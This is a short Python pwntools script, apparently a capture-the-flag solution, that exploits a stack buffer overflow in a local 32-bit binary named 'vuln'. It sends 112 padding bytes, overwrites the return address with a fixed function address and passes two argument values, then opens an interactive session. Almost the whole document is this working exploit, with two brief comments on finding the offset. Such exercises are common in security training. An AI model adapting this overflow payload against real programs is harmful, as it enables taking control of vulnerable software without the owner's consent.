#in 32 bit executables we see offset of string at eip.
#in 64 we see offset at esp.
from pwn import *
p=process('./vuln')
payload=""
payload+="A"*112
payload+=p32(0x080485cb)
payload+="A"*4
payload+= p32(0xDEADBEEF)
payload+= p32(0xDEADC0DE)
p.sendline(payload)

p.interactive()
